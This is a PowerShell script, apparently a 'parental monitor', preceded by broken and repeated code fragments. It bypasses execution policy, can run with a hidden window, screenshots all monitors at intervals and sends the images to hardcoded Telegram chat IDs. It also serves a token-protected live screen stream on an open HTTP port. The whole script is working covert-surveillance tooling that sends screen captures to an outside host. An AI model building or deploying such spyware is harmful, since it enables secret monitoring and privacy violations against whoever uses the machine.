Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
powershell.exe -ExecutionPolicy Bypass -NoProfile -File "C:\Users\Arth\Downloads\monitor_bot.ps1"

# --------------------------
# Logging setup
# --------------------------
$LOG_FILE = "$env:TEMP\monitor_bot.log"

function Log($message, $level="INFO") {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "$timestamp - $level - $message"
    Add-Content -Path $LOG_FILE -Value $entry
}

function Send-StartMessage {
    foreach ($id in $CHAT_IDS) {
        try {
            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
            $body = @{
                chat_id = $id
                text    = "Script Started ✅"
            }
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
        } catch {
            Log "Error sending start msg to $id: $_" "ERROR"
        }
    }
    Send-CombinedScreenshot
}

function Send-CombinedScreenshot {
    $bytes = Capture-CombinedImageBytes
    if (-not $bytes) { Log "No image bytes to send" "WARN"; return }
    try {
        # save temporary JPG
        [System.IO.File]::WriteAllBytes($global:tempJpg, $bytes)

        foreach ($id in $CHAT_IDS) {
            try {
                $url = "https://api.telegram.org/bot$TOKEN/sendPhoto"

                # build multipart content manually (PS 5.1 friendly)
                $formFields = @{
                    chat_id = $id
                }
                $fileBytes = Get-Content -Path $global:tempJpg -Encoding Byte

                $boundary = [System.Guid]::NewGuid().ToString()
                $LF = "`r`n"
                $bodyStream = New-Object System.IO.MemoryStream
                $writer = New-Object System.IO.StreamWriter($bodyStream)

                foreach ($field in $formFields.GetEnumerator()) {
                    $writer.Write("--$boundary$LF")
                    $writer.Write("Content-Disposition: form-data; name=`"{0}`"$LF$LF{1}$LF" -f $field.Key, $field.Value)
                }

                # add file part
                $writer.Write("--$boundary$LF")
                $writer.Write("Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.jpg`"$LF")
                $writer.Write("Content-Type: image/jpeg$LF$LF")
                $writer.Flush()
                $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
                $writer.Write("$LF--$boundary--$LF")
                $writer.Flush()

                $bodyStream.Position = 0
                Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyStream.ToArray() -ErrorAction Stop

                $writer.Dispose()
                $bodyStream.Dispose()
            } catch {
                Log "Error sending screenshot to $id: $_" "ERROR"
            }
        }
    } catch {
        Log "Error saving/sending screenshot: $_" "ERROR"
    } finally {
        if (Test-Path $global:tempJpg) { Remove-Item $global:tempJpg -ErrorAction SilentlyContinue }
    }
}


Log ("Error sending start msg to {0}: {1}" -f $id, $_) "ERROR"


Log ("Error sending screenshot to {0}: {1}" -f $id, $_) "ERROR"



-------------------
<#
monitor_bot.ps1
PowerShell parental monitor - single file (PowerShell 5.1 friendly)

Run for debugging:
    powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\monitor_bot.ps1

Run silently (once stable):
    powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File .\monitor_bot.ps1
#>

# ----------------------------
# CONFIG (EDIT THESE)
# ----------------------------
$ErrorActionPreference = "Stop"
$TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"          # <<-- replace with BotFather token
$CHAT_IDS = @(7208529004, 1399455903, 901578154)  # allowed recipients
$STREAM_PORT = 5000
$STREAM_TOKEN = "ZGFza2pkaGFranNkaGthanNkaGtpb2xxa2pmZ2RuZGlmZ2p5OTI0MzU2NzkzNDU3OTM0a2JuamZramRoZmtqYmRramZoc2Y="

$FRAME_INTERVAL = 0.8
$JPEG_QUALITY = 50
$AUTO_INTERVAL = 300
$RESIZE_SCALE = 0.5

$LOG_FILE = "$env:TEMP\monitor_bot.log"
$global:tempJpg = [IO.Path]::Combine($env:TEMP, "monitor_bot_temp.jpg")

# ----------------------------
# LOGGING
# ----------------------------
function Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "{0} - {1} - {2}" -f $timestamp, $Level, $Message
    try {
        Add-Content -Path $LOG_FILE -Value $entry -Encoding utf8
    } catch {
        # If logging fails, still write to console
        Write-Output $entry
    }
    Write-Output $entry
}

# register unhandled errors to the log too
Register-EngineEvent PowerShell.OnError -Action {
    $err = $EventArgs.Exception
    Add-Content -Path $LOG_FILE -Value ("{0} - UNHANDLED ERROR - {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $err)
}

# ----------------------------
# LOAD UI / DRAWING
# ----------------------------
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
} catch {
    Log ("Failed to load System.Drawing/System.Windows.Forms: {0}" -f $_) "ERROR"
    exit 1
}

# ----------------------------
# CAPTURE FUNCTIONS
# ----------------------------
function Capture-MonitorBitmap {
    param([int]$monitorIndex = 1)
    try {
        $screens = [System.Windows.Forms.Screen]::AllScreens
        if ($monitorIndex -lt 1 -or $monitorIndex -gt $screens.Length) {
            Log ("Invalid monitor index {0}; using 1" -f $monitorIndex) "WARN"
            $monitorIndex = 1
        }
        $screen = $screens[$monitorIndex - 1]
        $rect = $screen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $rect.Width, $rect.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($rect.X, $rect.Y, 0, 0, $rect.Size)
        $g.Dispose()
        return $bmp
    } catch {
        Log ("Capture-MonitorBitmap error: {0}" -f $_) "ERROR"
        return $null
    }
}

function Scale-Image {
    param([System.Drawing.Bitmap]$bmp)
    try {
        $newW = [int]($bmp.Width * $RESIZE_SCALE)
        $newH = [int]($bmp.Height * $RESIZE_SCALE)
        if ($newW -lt 1) { $newW = 1 }
        if ($newH -lt 1) { $newH = 1 }
        $scaled = New-Object System.Drawing.Bitmap $newW, $newH
        $g = [System.Drawing.Graphics]::FromImage($scaled)
        $g.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
        $g.DrawImage($bmp, 0, 0, $newW, $newH)
        $g.Dispose()
        $bmp.Dispose()
        return $scaled
    } catch {
        Log ("Scale-Image error: {0}" -f $_) "ERROR"
        return $bmp
    }
}

function Capture-CombinedImageBytes {
    try {
        $bmp1 = Capture-MonitorBitmap -monitorIndex 1
        if (-not $bmp1) { throw "Monitor 1 capture failed" }

        $bmp2 = $null
        if ([System.Windows.Forms.Screen]::AllScreens.Count -ge 2) {
            try { $bmp2 = Capture-MonitorBitmap -monitorIndex 2 } catch { $bmp2 = $null }
        }

        if ($RESIZE_SCALE -lt 1) {
            $bmp1 = Scale-Image $bmp1
            if ($bmp2) { $bmp2 = Scale-Image $bmp2 }
        }

        if ($bmp2) {
            $width = $bmp1.Width + $bmp2.Width
            $height = [Math]::Max($bmp1.Height, $bmp2.Height)
            $combined = New-Object System.Drawing.Bitmap $width, $height
            $g = [System.Drawing.Graphics]::FromImage($combined)
            $g.Clear([System.Drawing.Color]::Black)
            $g.DrawImage($bmp1, 0, 0)
            $g.DrawImage($bmp2, $bmp1.Width, 0)
            $g.Dispose()
            $bmp1.Dispose(); $bmp2.Dispose()
        } else {
            $width = $bmp1.Width * 2
            $height = $bmp1.Height
            $combined = New-Object System.Drawing.Bitmap $width, $height
            $g = [System.Drawing.Graphics]::FromImage($combined)
            $g.Clear([System.Drawing.Color]::Black)
            $g.DrawImage($bmp1, 0, 0)
            $g.DrawImage($bmp1, $bmp1.Width, 0)
            $g.Dispose()
            $bmp1.Dispose()
        }

        # Save to memory stream as JPEG with quality
        $ms = New-Object System.IO.MemoryStream
        $encoders = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()
        $jpegCodec = $encoders | Where-Object { $_.MimeType -eq "image/jpeg" } | Select-Object -First 1
        $params = New-Object System.Drawing.Imaging.EncoderParameters 1
        $params.Param[0] = (New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [int]$JPEG_QUALITY))
        $combined.Save($ms, $jpegCodec, $params)
        $combined.Dispose()
        $ms.Seek(0, 'Begin') | Out-Null
        $bytes = $ms.ToArray()
        $ms.Dispose()
        return $bytes
    } catch {
        Log ("Capture-CombinedImageBytes error: {0}" -f $_) "ERROR"
        return $null
    }
}

# ----------------------------
# TELEGRAM: send text
# ----------------------------
function Send-Message {
    param([string]$Text)
    foreach ($id in $CHAT_IDS) {
        try {
            $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
            $body = @{
                chat_id = $id
                text    = $Text
            }
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop | Out-Null
            Log ("Sent message to {0}" -f $id) "INFO"
        } catch {
            Log ("Error sending message to {0}: {1}" -f $id, $_) "ERROR"
        }
    }
}

# ----------------------------
# TELEGRAM: send photo (PS5.1 compatible)
# ----------------------------
function Send-CombinedScreenshot {
    $bytes = Capture-CombinedImageBytes
    if (-not $bytes) {
        Log "No image bytes to send" "WARN"
        return
    }

    try {
        [System.IO.File]::WriteAllBytes($global:tempJpg, $bytes)
    } catch {
        Log ("Failed writing temp JPG: {0}" -f $_) "ERROR"
        return
    }

    foreach ($id in $CHAT_IDS) {
        try {
            $url = "https://api.telegram.org/bot$TOKEN/sendPhoto"

            # Build multipart body manually
            $boundary = [System.Guid]::NewGuid().ToString()
            $LF = "`r`n"
            $bodyStream = New-Object System.IO.MemoryStream
            $writer = New-Object System.IO.StreamWriter($bodyStream, [System.Text.Encoding]::ASCII)

            # text fields
            $writer.Write("--$boundary$LF")
            $writer.Write("Content-Disposition: form-data; name=`"chat_id`"$LF$LF")
            $writer.Write("$id$LF")

            # file field
            $writer.Write("--$boundary$LF")
            $writer.Write("Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.jpg`"$LF")
            $writer.Write("Content-Type: image/jpeg$LF$LF")
            $writer.Flush()

            $fileBytes = [System.IO.File]::ReadAllBytes($global:tempJpg)
            $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
            $writer.Write("$LF--$boundary--$LF")
            $writer.Flush()

            $bodyBytes = $bodyStream.ToArray()

            Invoke-RestMethod -Uri $url -Method Post -ContentType ("multipart/form-data; boundary={0}" -f $boundary) -Body $bodyBytes -ErrorAction Stop | Out-Null

            $writer.Dispose()
            $bodyStream.Dispose()

            Log ("Sent screenshot to {0}" -f $id) "INFO"
        } catch {
            Log ("Error sending screenshot to {0}: {1}" -f $id, $_) "ERROR"
        } finally {
            if (Test-Path $global:tempJpg) { Remove-Item $global:tempJpg -ErrorAction SilentlyContinue }
        }
    }
}

# ----------------------------
# AUTO SCREENSHOT using Timer (in-process)
# ----------------------------
$autoTimer = $null
function Start-AutoScreenshotLoop {
    if ($null -ne $autoTimer) {
        return
    }
    $autoTimer = New-Object System.Timers.Timer
    $autoTimer.Interval = [double]($AUTO_INTERVAL * 1000)
    $autoTimer.AutoReset = $true
    $autoTimer.Enabled = $true
    $autoTimer.Add_Elapsed({
        try {
            Send-CombinedScreenshot
        } catch {
            Log ("Auto screenshot error: {0}" -f $_) "ERROR"
        }
    })
    $autoTimer.Start()
    Log "AutoScreenshot timer started (interval {0} s)" -f $AUTO_INTERVAL
}

# ----------------------------
# HTTP STREAM: handler function (runs in ThreadPool context)
# ----------------------------
function Handle-Client {
    param($ctx)

    try {
        $req = $ctx.Request
        $resp = $ctx.Response
        $path = $req.Url.AbsolutePath

        if ($path -eq "/s") {
            $html = "<html><head><title>Live Stream</title><style>body{margin:0;}img{width:100%;height:auto;}</style></head><body><img src='/stream?token=$STREAM_TOKEN' /></body></html>"
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
            $resp.ContentType = "text/html; charset=utf-8"
            $resp.ContentLength64 = $bytes.Length
            $resp.OutputStream.Write($bytes, 0, $bytes.Length)
            $resp.Close()
            return
        }

        if ($path -eq "/stream") {
            $q = [System.Web.HttpUtility]::ParseQueryString($req.Url.Query)
            if ($q.Get("token") -ne $STREAM_TOKEN) {
                $resp.StatusCode = 401
                $resp.Close()
                Log ("Unauthorized stream access from {0}" -f $req.RemoteEndPoint) "WARN"
                return
            }

            $boundary = "--frame"
            $resp.ContentType = "multipart/x-mixed-replace; boundary=$boundary"
            $resp.SendChunked = $true
            $out = $resp.OutputStream

            try {
                while ($true) {
                    $bytes = Capture-CombinedImageBytes
                    if ($bytes) {
                        $hdr = "`r`n$boundary`r`nContent-Type: image/jpeg`r`nContent-Length: $($bytes.Length)`r`n`r`n"
                        $hdrBytes = [System.Text.Encoding]::ASCII.GetBytes($hdr)
                        $out.Write($hdrBytes, 0, $hdrBytes.Length)
                        $out.Write($bytes, 0, $bytes.Length)
                        $out.Flush()
                    } else {
                        Start-Sleep -Seconds 1
                    }
                    Start-Sleep -Seconds $FRAME_INTERVAL
                }
            } catch {
                # client disconnected or other error - we just exit
            } finally {
                try { $out.Close() } catch {}
                try { $resp.Close() } catch {}
            }
            return
        }

        # Not found
        $resp.StatusCode = 404
        $resp.Close()
    } catch {
        Log ("Handle-Client error: {0}" -f $_) "ERROR"
        try { $ctx.Response.Close() } catch {}
    }
}

# ----------------------------
# START HTTP SERVER
# ----------------------------
function Start-HttpServer {
    try {
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://+:$STREAM_PORT/")
        $listener.Start()
        Log ("HTTP server started on port {0}" -f $STREAM_PORT)
    } catch {
        Log ("HttpListener start failed: {0}" -f $_) "ERROR"
        exit 1
    }

    # Accept loop - queue each client to ThreadPool to keep in-process
    while ($listener.IsListening) {
        try {
            $ctx = $listener.GetContext()
            # Queue to ThreadPool, pass $ctx
            [System.Threading.ThreadPool]::QueueUserWorkItem([System.Threading.WaitCallback]{
                param($state)
                Handle-Client $state
            }, $ctx) | Out-Null
        } catch {
            Log ("HttpListener accept loop error: {0}" -f $_) "ERROR"
            Start-Sleep -Seconds 1
        }
    }
}

# ----------------------------
# MAIN
# ----------------------------
try {
    Log "Script starting"
    Send-Message "Script Started ✅"
    # send one initial screenshot
    try { Send-CombinedScreenshot } catch { Log ("Initial screenshot error: {0}" -f $_) "ERROR" }

    Start-AutoScreenshotLoop

    # Print short stream URL (local)
    try {
        $ip = "127.0.0.1"
        try {
            $addr = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.IPAddress -notlike "169.*" } | Select-Object -First 1 -ExpandProperty IPAddress
            if ($addr) { $ip = $addr }
        } catch { }
        Log ("Short stream URL: http://{0}:{1}/s" -f $ip, $STREAM_PORT)
    } catch {}

    Start-HttpServer
} catch {
    Log ("Fatal script error: {0}" -f $_) "ERROR"
    Send-Message "Script Closed ❌"
} finally {
    Log "Script terminating"
}

